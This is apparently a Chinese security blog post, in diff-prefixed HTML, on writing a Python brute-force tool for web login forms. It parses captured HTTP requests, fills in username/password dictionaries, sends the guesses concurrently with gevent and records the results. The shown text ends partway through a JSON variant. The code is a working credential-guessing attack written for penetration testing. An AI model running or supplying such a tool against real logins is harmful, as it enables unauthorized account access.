+        <a  class="All 写点好玩的 "
+           href="/2022/03/15/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/freemarker%E6%93%8D%E6%8E%A7word/"
+           data-tag="工具使用"
+           data-author="" >
+            <span class="post-title" title="freemarker操控word">freemarker操控word</span>
+            <span class="post-date" title="2022-03-15 12:00:54">2022/03/15</span>
+        </a>
+        
+        
+        <a  class="All 操作系统 "
+           href="/2022/01/31/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="30天自制操作系统-学习笔记 day1~day10">30天自制操作系统-学习笔记 day1~day10</span>
+            <span class="post-date" title="2022-01-31 10:57:39">2022/01/31</span>
+        </a>
+        
+        
+        <a  class="All 杂项 "
+           href="/2022/01/12/%E6%9D%82%E9%A1%B9/GITHUB%E6%94%B6%E9%9B%86/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="GITHUB收集">GITHUB收集</span>
+            <span class="post-date" title="2022-01-12 20:07:03">2022/01/12</span>
+        </a>
+        
+        
+        <a  class="All 写点好玩的 "
+           href="/2022/01/11/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/web%E9%A1%B5%E9%9D%A2%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"
+           data-tag="渗透测试,工具开发"
+           data-author="" >
+            <span class="post-title" title="web页面密码爆破">web页面密码爆破</span>
+            <span class="post-date" title="2022-01-11 10:21:34">2022/01/11</span>
+        </a>
+        
+        
+        <a  class="All web安全工具篇 "
+           href="/2022/01/09/web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%AF%87/Goby%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Goby分析">Goby分析</span>
+            <span class="post-date" title="2022-01-09 13:35:49">2022/01/09</span>
+        </a>
+        
+        
+        <a  class="All 开发工具 "
+           href="/2021/08/15/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Shell%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="bash,脚本,shell,linux,开发"
+           data-author="" >
+            <span class="post-title" title="Shell脚本学习笔记">Shell脚本学习笔记</span>
+            <span class="post-date" title="2021-08-15 11:19:55">2021/08/15</span>
+        </a>
+        
+        
+        <a  class="All 渗透测试篇 "
+           href="/2021/07/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"
+           data-tag="渗透测试,工具使用"
+           data-author="" >
+            <span class="post-title" title="信息收集">信息收集</span>
+            <span class="post-date" title="2021-07-25 19:33:55">2021/07/25</span>
+        </a>
+        
+        
+        <a  class="All web安全漏洞篇 "
+           href="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/"
+           data-tag="web漏洞,MySQL"
+           data-author="" >
+            <span class="post-title" title="SQL注入相关">SQL注入相关</span>
+            <span class="post-date" title="2021-05-11 15:23:06">2021/05/11</span>
+        </a>
+        
+        
+        <a  class="All web安全工具篇 "
+           href="/2021/04/21/web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%AF%87/nmap%E4%BD%BF%E7%94%A8/"
+           data-tag="渗透测试,工具使用"
+           data-author="" >
+            <span class="post-title" title="nmap使用">nmap使用</span>
+            <span class="post-date" title="2021-04-21 19:29:51">2021/04/21</span>
+        </a>
+        
+        
+        <a  class="All 开发工具 "
+           href="/2021/04/20/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/docker%E7%9B%B8%E5%85%B3/"
+           data-tag="工具使用,脚本,docker"
+           data-author="" >
+            <span class="post-title" title="docker相关">docker相关</span>
+            <span class="post-date" title="2021-04-20 13:49:50">2021/04/20</span>
+        </a>
+        
+        
+        <a  class="All web安全漏洞篇 "
+           href="/2021/04/19/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9B%B8%E5%85%B3/"
+           data-tag="web漏洞,文件包含"
+           data-author="" >
+            <span class="post-title" title="文件包含漏洞相关">文件包含漏洞相关</span>
+            <span class="post-date" title="2021-04-19 14:49:59">2021/04/19</span>
+        </a>
+        
+        
+        <a  class="All 开发工具 "
+           href="/2021/04/16/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/hexo%E5%91%BD%E4%BB%A4/"
+           data-tag="工具使用,脚本"
+           data-author="" >
+            <span class="post-title" title="hexo相关">hexo相关</span>
+            <span class="post-date" title="2021-04-16 12:12:14">2021/04/16</span>
+        </a>
+        
+        
+        <a  class="All web安全工具篇 "
+           href="/2021/04/16/web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%AF%87/xray%E4%BD%BF%E7%94%A8/"
+           data-tag="渗透测试,工具使用"
+           data-author="" >
+            <span class="post-title" title="xray使用">xray使用</span>
+            <span class="post-date" title="2021-04-16 12:10:08">2021/04/16</span>
+        </a>
+        
+        
+        <a  class="All 脚本 "
+           href="/2021/04/15/%E8%84%9A%E6%9C%AC/some-script/"
+           data-tag="bash,脚本,python"
+           data-author="" >
+            <span class="post-title" title="some script">some script</span>
+            <span class="post-date" title="2021-04-15 11:23:33">2021/04/15</span>
+        </a>
+        
+        
+        <a  class="All 环境配置 "
+           href="/2021/04/15/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/centos%E9%83%A8%E7%BD%B2wordpress/"
+           data-tag="linux,环境配置,报错解决,WordPress"
+           data-author="" >
+            <span class="post-title" title="centos部署wordpress">centos部署wordpress</span>
+            <span class="post-date" title="2021-04-15 01:34:16">2021/04/15</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-写点好玩的/web页面密码爆破" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">web页面密码爆破</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="写点好玩的">写点好玩的</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">渗透测试</a>
+            
+            <a class="color5">工具开发</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2025-08-10 11:50:56'>2022-01-11 10:21</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:3.9k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-amp-%E5%88%86%E6%9E%90"><span class="toc-text">一.工具介绍&amp;分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">工具使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0"><span class="toc-text">二.功能实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-text">1. 数据包的获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E8%A6%81%E7%88%86%E7%A0%B4%E7%9A%84%E5%8F%82%E6%95%B0-%E7%94%9F%E6%88%90payload"><span class="toc-text">2.修改数据包中要爆破的参数,生成payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-text">3.多线程发送数据包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BF%9D%E5%AD%98%E7%BB%93%E6%9E%9C%E5%88%B0%E6%96%87%E4%BB%B6%E4%B8%AD"><span class="toc-text">4. 保存结果到文件中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BC%98%E5%8C%96%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92-amp-%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96"><span class="toc-text">5. 优化用户交互 &amp; 代码优化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E5%90%8E%E7%BB%AD%E4%BC%98%E5%8C%96"><span class="toc-text">三.后续优化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-JSON%E6%A0%BC%E5%BC%8F%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE"><span class="toc-text">1. JSON格式传输数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%A2%ABban-IP%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">2.被ban IP的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%9C%E4%BC%98%E5%8C%96"><span class="toc-text">3. 输出结果优化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%92%89%E9%92%89%E6%8F%90%E9%86%92"><span class="toc-text">4. 钉钉提醒</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-4 i,
+    .toc-level-4 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="一-工具介绍-amp-分析"><a href="#一-工具介绍-amp-分析" class="headerlink" title="一.工具介绍&amp;分析"></a>一.工具介绍&amp;分析</h2><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先带有验证码、以及密码前端加密的登录页面先不做讨论。</p>
+<p>常规的密码爆破为: </p>
+<blockquote>
+<p>页面输入用户名密码-&gt; burpsuite 抓包-&gt; 标记要爆破的位置-&gt; 导入字典 -&gt; 开始爆破 -&gt; 分析数据包是否爆破成功</p>
+</blockquote>
+<p>​    虽然整个流程大部分都可通过脚本进行实现，但关键的 <strong>标记要爆破的位置</strong> 却很难实现，这需要去考虑其提交的表单参数中，哪个是用户名，哪个是密码且两者不能颠倒。</p>
+<p>​    因此目前来看，完全的自动化只能处理一部分很“标准化”的登录框，比如页面只有一个表单，且用户名中包含user ,密码中包含password，这种页面通过正则表达式可以很容易实现完全的自动化，awvs都内置这种简单的弱口令自动检测</p>
+<p><img src="/2022/01/11/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/web%E9%A1%B5%E9%9D%A2%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image-20230927205245770.png" alt="image-20230927205245770"></p>
+<p>网上也有大佬编写的现成的工具。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yzddmr6/WebCrack">https://github.com/yzddmr6/WebCrack</a></p>
+<p>​    但这种方式并不能覆盖全部的网页，较为复杂的网页登录框还是需要<strong>人为</strong>的进行筛选、标记参数，进行一种半自动化的爆破。</p>
+<ol>
+<li>登录框输入固定的标记：如用户名为qwrdxeradmin,密码为qwrdxerpassword，这两个参数固定，且数据包中不能有同样的字段出现。</li>
+<li>抓包，保存</li>
+<li>使用工具匹配到数据包中用户名和密码的位置 ，用字典替换内容，发送数据包</li>
+<li>保存请求和响应的三个关键数据 ： 字典值、状态码、响应数据包大小。</li>
+</ol>
+<p><em><span id="more"></span></em> </p>
+<p>​    综上，目前实现的脚本需要实现以下功能：</p>
+<ol>
+<li>爆破用户名 和爆破密码可自定义，默认使用10个常用用户名+3000字典（也就是每个url需要发送30000个数据包)</li>
+<li>如果指定爆破密码或用户名，可选择使用较大的字典。</li>
+<li>对每个请求的响应数据包进行 分析，保留关键数据。</li>
+</ol>
+<h2 id="二-功能实现"><a href="#二-功能实现" class="headerlink" title="二.功能实现"></a>二.功能实现</h2><h3 id="1-数据包的获取"><a href="#1-数据包的获取" class="headerlink" title="1. 数据包的获取"></a>1. 数据包的获取</h3><p>​    因为数据包是在burp中复制的，因此最好能直接解析文本格式的数据包，然后在数据包中用户名或密码位置填入数据，发送数据包。</p>
+<p>​    这篇文章给了一个很好的思路:<a target="_blank" rel="noopener" href="https://blog.csdn.net/haoren_xhf/article/details/104937390">https://blog.csdn.net/haoren_xhf/article/details/104937390</a></p>
+<ol>
+<li>读入数据包</li>
+<li>在数据包中，第一行有三个重要的信息: 请求的方法(POST / GET  ,一般为POST提交)、请求的目录 、请求的HTTP协议版本，因此对第一行数据可读入请求的类型。</li>
+<li>后续行中，大部分为请求头信息，不做修改直接读入即可。</li>
+<li>POST提交中，最后一行为POST提交的数据，也就是用户名密码 ，我们需要在这里填入字典，重新发送数据。</li>
+</ol>
+<pre><code class="http">POST /fileadmin/index.php? HTTP/1.1
+Host: 123.345.567.123
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Connection: close
+Cookie: PHPSESSID=qkivqmbgbiomaum26df44ucsv4
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+username=admin123&amp;password=admin123
+</code></pre>
+<p>然后分析一下文章中的关键代码</p>
+<pre><code class="python">import requests, urllib3
+import sys, os
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)# 禁用https协议报错
+def sender(content, allowredirect=True):
+    method = &#39;get&#39;
+    url = &#39;&#39;
+    headers = &#123;&#125;
+    correct = True
+    data = &#39;&#39;
+    lines = content.strip().split(&#39;\n&#39;)
+    for key, line in enumerate(lines):
+        if key == 0: # 第一行数据需要单独处理，获取请求头数据
+            tmp = line.strip().split()
+            if len(tmp) != 3:
+                print(&#39;第一行错误 &#39; + line)
+                correct = False
+                break
+            method = tmp[0].lower() # 这里获取到请求是POST或是GET
+            url = tmp[1]
+        elif method == &#39;post&#39; and key == len(lines) - 1:# 最后一行数据为POST提交的数据，进行单独的处理
+            data = line.strip()
+        elif line: # 其他行尾请求头数据，统一处理即可
+            tmp = line.strip().split(&#39;:&#39;)
+            if len(tmp) &lt; 2:
+                correct = False
+                print(&#39;headers error &#39; + line)
+                break
+            tmp[1] = tmp[1].strip()
+            headers[tmp[0].lower()] = &#39;:&#39;.join(tmp[1:])
+
+    if correct:
+        if not url.startswith(&#39;http:&#39;) and not url.startswith(&#39;https:&#39;):
+            url = &#39;http://&#39; + headers.get(&#39;host&#39;) + url
+
+        return requests.request(**&#123;
+            &#39;url&#39;: url,
+            &#39;data&#39;: data,
+            &#39;verify&#39;: False,
+            &#39;method&#39;: method,
+            &#39;headers&#39;: headers,
+            &#39;allow_redirects&#39;: allowredirect,
+        &#125;)
+
+content = &#39;&#39;&#39;
+POST /fileadmin/index.php? HTTP/1.1
+Host: 123.345.567.123
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Connection: close
+Cookie: PHPSESSID=qkivqmbgbiomaum26df44ucsv4
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+username=admin123&amp;password=admin123
+
+&#39;&#39;&#39;
+print(sender(content).text)
+</code></pre>
+<h3 id="2-修改数据包中要爆破的参数-生成payload"><a href="#2-修改数据包中要爆破的参数-生成payload" class="headerlink" title="2.修改数据包中要爆破的参数,生成payload"></a>2.修改数据包中要爆破的参数,生成payload</h3><p>​    文中代码是重新发送数据包，但要爆破密码，需要对数据包中POST提交的数据进行修改。    </p>
+<p>​    因此需要定义一个如下函数，第一个参数为封装好的数据包，第二个参数为POST提交的数据、后续需要对数据进行字典替换、后面两个决定是否爆破用户名或密码。</p>
+<p>​    中间过程为字典替换，发送数据包，记录payload 、响应数据包中状态码、响应数据包长度。</p>
+<pre><code class="python">def enumerator(package,data,username=False,password=True)
+    ...
+    return status_code payload length
+</code></pre>
+<p>​    具体实现代码如下:</p>
+<blockquote>
+<p>字典替换: </p>
+<p>也即是在数据包中最后一行</p>
+<p>username=qwrdxername&amp;password=qwrdxername</p>
+<p>我们要将其中的qwrdxername和qwrdxername 进行字典替换，</p>
+</blockquote>
+<pre><code class="python">def generate_payload(usernameandpassowrd=&quot;yonghuming=qwrdxername&amp;mima=qwrdxerpasswd&amp;session=DAWAWRFWAFAWEDF&amp;test=testets&quot;):
+    tmpvar=usernameandpassowrd.split(&quot;&amp;&quot;) #临时存储用户名和密码
+    payloadlist=[]
+    tmpdic=&#123;&#125;
+    user=&quot;&quot;
+    passwd=&quot;&quot;
+    payloadtemple=&quot;&quot;
+    for i in tmpvar:#在post提交表单中可能有其他数据，因此现将键值对存入字典中，然后将username和passwd提出来
+        print(i)
+        tmpdic[i.split(&#39;=&#39;)[1]]=i.split(&#39;=&#39;)[0]
+
+    print(tmpdic)
+    # 获取到两个表单中的参数名
+    user=tmpdic[&#39;qwrdxername&#39;]
+    passwd=tmpdic[&#39;qwrdxerpasswd&#39;]
+    del tmpdic[&#39;qwrdxername&#39;]
+    del tmpdic[&#39;qwrdxerpasswd&#39;]
+    # 生成payload
+    for i in tmpdic.keys():# 除用户名密码外其他固定参数装入payload中
+        payloadtemple+=tmpdic[i]+&quot;=&quot;+i+&quot;&amp;&quot;
+
+    for username in open(&quot;dictionary/username.txt&quot;,&quot;r&quot;,encoding=&#39;UTF-8-sig&#39;):
+        for password in open(&quot;dictionary/password.txt&quot;, &quot;r&quot;,encoding=&#39;UTF-8-sig&#39;):
+            if payloadtemple!=&quot;&quot;:
+                payloadlist.append(payloadtemple+&quot;&amp;&quot;+user+&quot;=&quot;+username.strip()+&quot;&amp;&quot;+passwd+&quot;=&quot;+password.strip())
+            else:
+                payloadlist.append(user + &quot;=&quot; + username.strip() + &quot;&amp;&quot; + passwd + &quot;=&quot; + password.strip())
+    return payloadlist
+</code></pre>
+<h3 id="3-多线程发送数据包"><a href="#3-多线程发送数据包" class="headerlink" title="3.多线程发送数据包"></a>3.多线程发送数据包</h3><p>至此主体已实现</p>
+<pre><code class="python">for i in payload:
+    send_request(url,i,headers,method)
+    
+def send_request(url,payload,headers,method):
+    #发送数据包
+    resp=requests.request(**&#123;
+        &#39;url&#39;: url,
+        &#39;data&#39;: payload,
+        &#39;verify&#39;: False,
+        &#39;method&#39;: method,
+        &#39;headers&#39;: headers,
+        &#39;allow_redirects&#39;: True,
+        # &#39;proxies&#39;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;
+    &#125;)
+    print(payload,resp.status_code,len(resp.text))
+</code></pre>
+<p><img src="/2022/01/11/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/web%E9%A1%B5%E9%9D%A2%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image-20230927205257969.png" alt="image-20230927205257969"></p>
+<p>但发送速度过于缓慢，几个用户名+ 千级别字典，一个目标就需要几十分钟乃至几个小时。</p>
+<p>需要对发包进行改进，进行多线程发包。百度翻阅一下，gevent库是个不错的选择</p>
+<p><img src="/2022/01/11/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/web%E9%A1%B5%E9%9D%A2%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image-20230927205303930.png" alt="image-20230927205303930"></p>
+<p>如下图，使用多线程发送了九个数据包，可见速度提升很大</p>
+<p><img src="/2022/01/11/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/web%E9%A1%B5%E9%9D%A2%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image-20230927205307895.png" alt="image-20230927205307895"></p>
+<p>发送100个数据包，输出如下</p>
+<pre><code class="shell">使用gevent
+该循环程序运行时间： 1.4333410263061523
+
+使用普通for循环
+该循环程序运行时间： 78.70576453208923
+</code></pre>
+<p>最初版本核心代码如下:</p>
+<pre><code class="python">import gevent
+from gevent import socket
+from  gevent import  monkey
+monkey.patch_all()  # 加上这个补丁瞬间变快了 - -
+url, payloads, headers, method = generate_param(content) #上文中生成payload的代码
+
+jobs=[]
+begin_time = time()
+for payload in payloads:
+    jobs.append(gevent.spawn(send_request, url, payload, headers, method))
+gevent.joinall(jobs, timeout=5)
+
+
+#发送数据包
+def send_request(url,payload,headers,method):
+    #发送数据包
+    resp=requests.request(**&#123;
+        &#39;url&#39;: url,
+        &#39;data&#39;: payload,
+        &#39;verify&#39;: False,
+        &#39;method&#39;: method,
+        &#39;headers&#39;: headers,
+        &#39;allow_redirects&#39;: True,
+        # &#39;proxies&#39;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;
+    &#125;)
+    print(payload,resp.status_code,len(resp.text))
+</code></pre>
+<p>程序获取到payload列表以及其他参数后，使用for循环遍历payloads，为每一个payload分配一个 send_request的job ，然后调用gevent.joinall ，他会自动调用这些job。</p>
+<p>在vps上运行，感觉还不错</p>
+<p><img src="/2022/01/11/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/web%E9%A1%B5%E9%9D%A2%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image-20220112170919713.png" alt="image-20220112170919713"></p>
+<p>然后就是限制一下并发运行数，防止目标宕机。</p>
+<p>百度到了这篇文章，<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012206617/article/details/108059173">https://blog.csdn.net/u012206617/article/details/108059173</a></p>
+<p>也就是说可以通过gevent.pool 里面的Pool类来实现。</p>
+<p>修改部分代码如下</p>
+<pre><code class="python">from gevent.pool import Pool#  导入类
+
+p = Pool(2)  # 创建一个Pool对象，参数为最大并发的携程数
+for payload in payloads:
+    print(payload)
+    # 在添加job时，使用的是p对象
+    jobs.append(p.spawn(send_request, url, payload, headers, method))
+
+    # 正常启动即可
+gevent.joinall(jobs, timeout=5)
+</code></pre>
+<p>测试发包时间如下:</p>
+<pre><code class="python">Pool(2)  2用户名X 100密码
+该循环程序运行时间： 58.2290563583374
+Pool(5)  2用户名X 100密码
+该循环程序运行时间： 23.66639494895935
+Pool(10)  2用户名X 100密码
+该循环程序运行时间： 11.918724298477173
+</code></pre>
+<p>设置成5~10个左右就可以了</p>
+<h3 id="4-保存结果到文件中"><a href="#4-保存结果到文件中" class="headerlink" title="4. 保存结果到文件中"></a>4. 保存结果到文件中</h3><p><img src="/2022/01/11/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/web%E9%A1%B5%E9%9D%A2%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image-20220112205300007.png" alt="image-20220112205300007"></p>
+<p>在burpsuite 爆破中，我们主要关注的是Payload 、状态码、响应长度， 因此在代码中要实现的是结果保存、具有排序功能。</p>
+<p>因此可以保存到Excel表格中，方便排序。</p>
+<p><strong>关键点在于: 并发的请求如何写入同一个文件中</strong></p>
+<p>两种思路:</p>
+<p>方法一: 创建一个列表变量存储结果，引入 锁，同一时间只能有一个协程访问该列表</p>
+<p>方法二: 每一个数据包保存为一个文件，在全部请求结束后，单独调用一个函数来将这些文件整合到一起。</p>
+<p>感觉方法一好一点，gevent的锁在gevent.lock里，对发送数据包函数进行 修改如下。</p>
+<pre><code class="python">def sender(url,payloads,headers,method):
+    sem = BoundedSemaphore(1) #锁
+    result=[]
+
+    jobs = []
+    p = Pool(10)
+    for payload in payloads:
+        print(payload)
+        jobs.append(p.spawn(send_request, url, payload, headers, method,result,sem))
+    gevent.joinall(jobs, timeout=5)
+    print(len(result))
+
+
+def send_request(url,payload,headers,method,result,sem):
+    #发送数据包
+    resp=requests.request(**&#123;
+        &#39;url&#39;: url,
+        &#39;data&#39;: payload,
+        &#39;verify&#39;: False,
+        &#39;method&#39;: method,
+        &#39;headers&#39;: headers,
+        &#39;allow_redirects&#39;: True,
+        # &#39;proxies&#39;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;
+    &#125;)
+    sem.acquire()
+    result.append([payload,resp.status_code,len(resp.text)])
+    sem.release()
+</code></pre>
+<p>sender函数用于发送数据包，</p>
+<p>首先创建一个锁sem = BoundedSemaphore(1) ， 参数为1 意味着同一时间只能有一个协程获得锁</p>
+<p>result列表用于记录结果</p>
+<p>send_reques函数最后两个参数为锁和用于结果保存的变量，请求完成之后会将关键信息写入result中，为了防止多协程访问导致变量异常，引入了锁。</p>
+<pre><code>sem.acquire()
+result.append([payload,resp.status_code,len(resp.text)])
+sem.release()
+</code></pre>
+<p><img src="/2022/01/11/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/web%E9%A1%B5%E9%9D%A2%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image-20220112213910373.png" alt="image-20220112213910373"></p>
+<p>然后是创建一个函数保存结果到文件中。</p>
+<pre><code class="python">import csv
+def  savecsv(result):
+    f = open(&#39;222.csv&#39;, &#39;w&#39;)
+    writer = csv.writer(f)
+    for i in result:
+        writer.writerow(i)
+    f.close()
+</code></pre>
+<p><img src="/2022/01/11/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/web%E9%A1%B5%E9%9D%A2%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image-20220112231551862.png" alt="image-20220112231551862"></p>
+<p>成功</p>
+<h3 id="5-优化用户交互-amp-代码优化"><a href="#5-优化用户交互-amp-代码优化" class="headerlink" title="5. 优化用户交互 &amp; 代码优化"></a>5. 优化用户交互 &amp; 代码优化</h3><p>从使用的角度来看，需要支持以下功能</p>
+<pre><code class="shell">python  xxx.py    直接运行，会对存放目录的数据包进行批量检测。
+
+-p  password.txt  可以指定自定义字典。
+
+-u  username.txt 可以指定用户名字典。
+
+输出结果的文件为指定IP+文件后缀。
+
+进程控制：可以指定协程的数量( 默认为5)。
+
+错误控制: 如数据包中没找到用户名和密码字段，会直接报错，退出程序。
+</code></pre>
+<p>获取用户参数代码如下</p>
+<pre><code class="python">import argparse
+
+
+def parser():
+    parser = argparse.ArgumentParser()
+    parser.description = &#39;可指定用户名和密码字典、线程数量&#39;
+    parser.add_argument(&quot;-t&quot;, &quot;--thread&quot;, help=&quot;指定协程数，默认为5&quot;, dest=&quot;tnum&quot;, type=int, default=&quot;5&quot;)
+    parser.add_argument(&quot;-p&quot;, &quot;--password&quot;, help=&quot;指定自定义字典路径&quot;, dest=&quot;ppath&quot;, type=str, default=&quot;dictionary/password.txt&quot;)
+    args = parser.parse_args()
+    return args
+</code></pre>
+<h2 id="三-后续优化"><a href="#三-后续优化" class="headerlink" title="三.后续优化"></a>三.后续优化</h2><h3 id="1-JSON格式传输数据"><a href="#1-JSON格式传输数据" class="headerlink" title="1. JSON格式传输数据"></a>1. JSON格式传输数据</h3><p>实际测试中有一部分目标使用的是JSON格式传输，其数据字段如下</p>
+<pre><code class="shell">&#123;&quot;code&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;referer&quot;:&quot;index.html&quot;&#125;
+</code></pre>
+<p>尝试使用字符串的replace方法来进行payload生成、</p>
+<pre><code class="python"># 因为有的数据是通过JSON传输的，因此考虑使用正则匹配
+def generate_payload_v2(usernameandpassowrd=&quot;yonghuming=qwrdxername&amp;mima=qwrdxerpasswd&amp;session=DAWAWRFWAFAWEDF&amp;test=testets&quot;):
+
+    payloadlist=[]
